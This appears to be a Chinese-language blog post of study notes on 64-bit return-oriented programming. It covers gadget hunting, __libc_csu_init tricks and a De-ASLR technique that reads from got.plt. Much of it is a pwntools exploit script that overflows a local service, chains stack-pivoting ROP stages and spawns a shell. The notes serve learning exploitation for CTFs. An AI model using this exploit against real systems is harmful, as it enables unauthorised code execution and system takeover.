@@ -1,0 +1,318 @@
+
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>x86_64</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/links/">友链</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/08/17/链接库/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/05/x86_64/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/05/x86_64/&text=x86_64"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/05/x86_64/&is_video=false&description=x86_64"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=x86_64&body=Check out this article: http://yoursite.com/2020/09/05/x86_64/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/05/x86_64/&name=x86_64&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/05/x86_64/&t=x86_64"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#x86-64"><span class="toc-number">1.</span> <span class="toc-text">x86_64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-64-bit-ROP"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 64-bit ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一定会有的gadget"><span class="toc-number">1.1.1.</span> <span class="toc-text">一定会有的gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De-ASLR-with-rop"><span class="toc-number">1.1.2.</span> <span class="toc-text">De-ASLR with rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#calculate-function-address-without-information-leakage"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">calculate function address without information leakage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从got-plt上取值"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">从got.plt上取值</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        x86_64
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">安全技术和个人生活随笔</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-05T13:39:31.000Z" itemprop="datePublished">2020-09-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h1><h2 id="0x01-64-bit-ROP"><a href="#0x01-64-bit-ROP" class="headerlink" title="0x01 64-bit ROP"></a>0x01 64-bit ROP</h2><ul>
+<li><p>syscall 寄存器传参，完全不用栈，rax指令号，参数rdi, rsi, rdx, rcx, r8, r9, &lt;syscall&gt;, 不需要平栈</p>
+</li>
+<li><p>r8-r15 前缀（REX prefix）40H~4FH+指令表示使用附加寄存器（r8-r15）</p>
+</li>
+<li><p>r12-r15 调用函数时，被调用函数保护现场（callee saved ），所以经常有push/pop r12/…/r15</p>
+</li>
+<li><p>pop r14 = 415e / pop rsi = 5e //可以利用后半段作为rop控制寄存器</p>
+</li>
+<li><p>同理pop r15 = 415f / pop rdi = 5f</p>
+</li>
+<li><p>ROPgadget 增加预设搜寻长度：<br>  <code>ROPgadget --binary ./code --depth 100</code></p>
+<h3 id="一定会有的gadget"><a href="#一定会有的gadget" class="headerlink" title="一定会有的gadget"></a>一定会有的gadget</h3></li>
+<li><p>控制register</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">41 5c     pop r12 -&gt; pop rsp (5c)</span><br><span class="line">41 5d     pop r13 -&gt; pop rbp (5d)</span><br><span class="line">41 5e     pop r14 -&gt; pop rsi (5e)</span><br><span class="line">41 5f     pop r15 -&gt; pop rdi (5f)</span><br><span class="line">c3        ret</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>原生小段gadget</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;__libc_csu_init&gt;:</span><br><span class="line">4c 89 ea        mov  rdx,r13</span><br><span class="line">4c 89 f6        mov  rsi,r14</span><br><span class="line">4c 89 ff        mov  edi,r15d</span><br><span class="line">41 ff 14 dc     call QWORD PTR [r12+rbx*8]</span><br><span class="line">;此段程序作为一个gadget，没有ret可以控制ret</span><br><span class="line">;在已知位置写一个buffer，首地址给r12，控制r13,r14,r15d给rdx,rsi,edi赋值</span><br><span class="line">;注意，buffer内容：pop rXX ；ret</span><br><span class="line">;否则回不到栈继续执行下一个gadget，会跳到call后面执行libc</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>控制rax（因为jmp rax 很常见）</p>
+<ul>
+<li>gets,fgets会回传buffer rax=rdi<ul>
+<li>rdi = &amp;buffer, 所以缺点&amp;buffer必须可写，否则crash</li>
+<li>必须向buffer中写入一些，不能设置写入为0，否则gets会crash，fgets return rax = 0</li>
+</ul>
+</li>
+<li>strcpy,strncpy同理<ul>
+<li>可以设置写入长度位0来规避buffer必须可写，strncpy不会crash</li>
+</ul>
+</li>
+<li>alarm（call第二次时会ret第一次的alarm的参数）<ul>
+<li>只能控制unsigned int 即eax，而且必须等第一次，很久<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sendROP([</span><br><span class="line">    alarm</span><br><span class="line">    pop_rdi_ret, buf, gets,</span><br><span class="line">    pop_rbp_ret, buf<span class="number">-8</span>, leave_ret])</span><br><span class="line">sleep(offset_to_system)</span><br><span class="line">sendROP([</span><br><span class="line">    alarm,</span><br><span class="line">    jmp_rax])</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>控制rcx（少用）</p>
+<ul>
+<li>使用call func 比如strpy，输入字串有时候给rcx</li>
+<li>有的syscall，rcx有时是syscall之后下一行的地址，可以call一个syscall(无害的比如alarm)</li>
+</ul>
+</li>
+<li><p>rax写入memory（拿rax值）</p>
+<ul>
+<li>stack指向mem，然后push_gadget_call,提前修改call的内容为pop_ret<h3 id="De-ASLR-with-rop"><a href="#De-ASLR-with-rop" class="headerlink" title="De-ASLR with rop"></a>De-ASLR with rop</h3><h4 id="calculate-function-address-without-information-leakage"><a href="#calculate-function-address-without-information-leakage" class="headerlink" title="calculate function address without information leakage"></a>calculate function address without information leakage</h4>只能送一次payload，做到ret2libc</li>
+</ul>
+</li>
+<li><p>猜测libc，商务平台有限</p>
+</li>
+<li><p>_dl_runtime_resolve (relro保护时就凉凉）</p>
+<h4 id="从got-plt上取值"><a href="#从got-plt上取值" class="headerlink" title="从got.plt上取值"></a>从got.plt上取值</h4><p>原理简单说就是，从got.plt捞一个base地址，把它和推算出的offset放入内存然后call ptr[base][offset]</p>
+</li>
+<li><p>pop_rsp_r13_r14_r15_ret 转移Stack并pop一系列，出现在csu_init函数pop r12的后半段开始半条指令刚好是pop rsp</p>
+</li>
+<li><p>需要提前填充寄存器值和返回值在rsp指向的，</p>
+</li>
+<li><p>ret栈上填好leave_ret回来; 并且在一开始就设置好rbp来migrated stack</p>
+</li>
+<li><p>取出的base在r13上。</p>
+</li>
+<li><p>got.plt 在full relro下是只读的，可以跳到后半段（.got~.data)读完got然后ret刚好到.data可写一点（盖到一些渣渣但不影响:_data…__data_start）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#offset = (0x46640 - 0x6f440) &amp; 0xffffffff #已知的函数库内get（要捞的函数）地址与syscall的地址相对偏移量，利用add ebx esi拿到低4位，再csu_init拿到把低四位ebx塞回mem，同理再捞高四位，所有操作加4byte，push到刚刚低四位“前面”，注意是加，小端序</span></span><br><span class="line"><span class="comment">#stack 不用对齐所以不怕</span></span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x400430</span></span><br><span class="line">...</span><br><span class="line">gets_got = <span class="number">0x600ff0</span></span><br><span class="line"></span><br><span class="line">buf1 = <span class="number">0x601f00</span> <span class="comment">#可以开一两个，migration时候栈最好够大，开全也有好处，清晰</span></span><br><span class="line">...</span><br><span class="line">buf8 = <span class="number">0x601800</span><span class="comment">#0x602000之内都可以，ida查看段尾</span></span><br><span class="line">rop1 = [</span><br><span class="line">    pop_rdi_ret, buf1,gets, <span class="comment">#rop2 此段会从开一个gets等待输入，调用函数正常读取，不是溢出，strcpy也可以</span></span><br><span class="line">    pop_rdi_ret, buf2,gets, <span class="comment">#rop4</span></span><br><span class="line">    pop_rdi_ret, buf3,gets, <span class="comment">#rop5</span></span><br><span class="line">    pop_rdi_ret, buf4,gets, <span class="comment">#rop7</span></span><br><span class="line">    pop_rdi_ret, buf5,gets, <span class="comment">#rop9</span></span><br><span class="line">    pop_rdi_ret, buf6,gets, <span class="comment">#rop10</span></span><br><span class="line">    pop_rdi_ret, buf7,gets, <span class="comment">#rop13</span></span><br><span class="line">    pop_rbp_ret, buf1 - <span class="number">8</span>, leave_ret, <span class="comment">#-8因为64位</span></span><br><span class="line">    ]</span><br><span class="line">rop2 = [<span class="comment"># buf1</span></span><br><span class="line">    pop_rdi_ret, gets_got+<span class="number">24</span>, gets, <span class="comment"># rop3（运行ing）</span></span><br><span class="line">    pop_rbp_ret, buf2<span class="number">-8</span>,</span><br><span class="line">    pop_rsp_r13_r14_r15_ret, gets_got</span><br><span class="line">    ]</span><br><span class="line">rop3 = [<span class="comment">#gets_got+24 刚好在got后边可写部分</span></span><br><span class="line">    leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop4 = [<span class="comment">#buf2</span></span><br><span class="line">    csu_init,</span><br><span class="line">    pop_rbp_ret, buf3<span class="number">-8</span>, leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop5 = [<span class="comment">#buf3</span></span><br><span class="line">    pop_rdi_ret, buf2<span class="number">-24</span>, gets, <span class="comment">#rop6_1</span></span><br><span class="line">    pop_rdi_ret, buf2<span class="number">-32</span>, gets, <span class="comment">#rop6_1</span></span><br><span class="line">    pop_rbp_ret, buf2<span class="number">-24</span><span class="number">-8</span>, leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop6_1 = [<span class="comment">#buf2-24</span></span><br><span class="line">    pop_rbx_rbp_r12_r13_r14_r15_ret<span class="comment">#算好位置对接pop rbx，就可以拿到r13</span></span><br><span class="line">    <span class="comment">#拿r13给rbx是防止出现r13覆盖重要的东西,_cus_init时候最后一个push的是rbx，所以后面不会再push东西盖坏stack上已有的内容（低四位）</span></span><br><span class="line">    ]</span><br><span class="line">rop6_2 = [<span class="comment">#buf2+32</span></span><br><span class="line">    pop_rsi_r15_ret, offset, <span class="number">0</span>, <span class="comment">#rsi中存已知offset（system-gets）</span></span><br><span class="line">    add_ebx_esi_ret, <span class="comment">#有 MOV CS:__BSS_START, 1 就会有</span></span><br><span class="line">    csu_init, <span class="comment">#无害函数，会喷很多数据在stack，其中有rbx, r12-r15(!!! r13)</span></span><br><span class="line">    pop_rbp_ret, buf4<span class="number">-8</span>, leave_ret </span><br><span class="line">    ]</span><br><span class="line">rop7 = [<span class="comment">#buf4</span></span><br><span class="line">    pop_rdi_ret, gets_got+<span class="number">28</span>, gets, <span class="comment">#rop8</span></span><br><span class="line">    pop_rbp_ret, buf5<span class="number">-8</span>,</span><br><span class="line">    pop_rsp_r13_r14_r15_ret, gets_got+<span class="number">4</span></span><br><span class="line">    ]</span><br><span class="line">rop8 = [<span class="comment">#gets_got+28</span></span><br><span class="line">    leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop9 = [<span class="comment">#buf5</span></span><br><span class="line">    csu-init,<span class="comment"># push r13 在栈上，即同样方法再拿gets_got给13，要存到rbx高4位</span></span><br><span class="line">    pop_rbp_ret, buf6<span class="number">-8</span>, leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop10 = [ <span class="comment">#buf6</span></span><br><span class="line">    pop_rdi_ret, buf5<span class="number">-24</span>, gets, <span class="comment">#rop11_1</span></span><br><span class="line">    pop_rdi_ret, buf5+<span class="number">32</span>, gets,  <span class="comment">#rop11_2</span></span><br><span class="line">    pop_rbp_ret, buf5<span class="number">-24</span><span class="number">-8</span>, leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop11_1 = [<span class="comment">#buf5-24</span></span><br><span class="line">    pop_rbx_rbp_r12_r13_r14_r15_ret<span class="comment">#算好位置对接pop rbx，就可以拿到r13</span></span><br><span class="line">    ]</span><br><span class="line">rop11_2 = [<span class="comment">#buf5+32</span></span><br><span class="line">    pop_rdi_ret, buf2+<span class="number">68</span>, gets, <span class="comment">#rop12</span></span><br><span class="line">    pop_rbp_ret, buf2+<span class="number">68</span><span class="number">-8</span>, leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop12 = [ <span class="comment">#buf2+164</span></span><br><span class="line">    csu_init, pop_rbp_ret, buf7<span class="number">-8</span>, leave_ret</span><br><span class="line">    ]</span><br><span class="line">rop13= [</span><br><span class="line">    pop_rdi_ret, buf8, gets, <span class="comment"># shell command</span></span><br><span class="line">    pop_rdi_ret, buf8,</span><br><span class="line">    pop_rbx_rbp_r12_r13_r14_r15_ret, <span class="number">0</span>, <span class="number">0</span>, buf2+<span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    call_at_r12</span><br><span class="line">    ]</span><br><span class="line">r.send(<span class="string">'A'</span>*<span class="number">24</span> + </span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop1))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop2))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop4))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop5))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop7))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop9))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop10))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop13))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop3))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop6_1))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop6_2))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop8))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop11_1))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop11_2))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">''</span>.join(map(p64, rop12))+<span class="string">'\n'</span>+</span><br><span class="line">    <span class="string">'sh'</span>+<span class="string">'\n'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>![](<em>v</em>images/20190812104928260_30094.png =900x)</p>
+<p>![](<em>v</em>images/20190812104743737_30955.png =900x)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/links/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#x86-64"><span class="toc-number">1.</span> <span class="toc-text">x86_64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-64-bit-ROP"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 64-bit ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一定会有的gadget"><span class="toc-number">1.1.1.</span> <span class="toc-text">一定会有的gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De-ASLR-with-rop"><span class="toc-number">1.1.2.</span> <span class="toc-text">De-ASLR with rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#calculate-function-address-without-information-leakage"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">calculate function address without information leakage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从got-plt上取值"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">从got.plt上取值</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/05/x86_64/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/05/x86_64/&text=x86_64"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/05/x86_64/&is_video=false&description=x86_64"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=x86_64&body=Check out this article: http://yoursite.com/2020/09/05/x86_64/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/05/x86_64/&title=x86_64"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/05/x86_64/&name=x86_64&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/05/x86_64/&t=x86_64"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Tyr Wang
+    <span> · </span><a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37032302000153" style="text-decoration:none;height:20px;"><img src="/uploads/beian.png" style="vertical-align:middle;"/><span style="height:20px;margin: 0px 0px 0px 5px;">鲁公网安备 37032302000153号</span></a>
+    <span> · </span><a href="http://www.beian.miit.gov.cn" target="_blank" style="text-decoration:none;">鲁ICP备20011350号</a>
+  </div>
+  <div class="footer-right">
+        由 <a href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" class="theme-link" rel="noopener" target="_blank"><img src="/uploads/powerby.png" height="20" style="vertical-align: middle;"></a> 提供CDN服务支持 
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
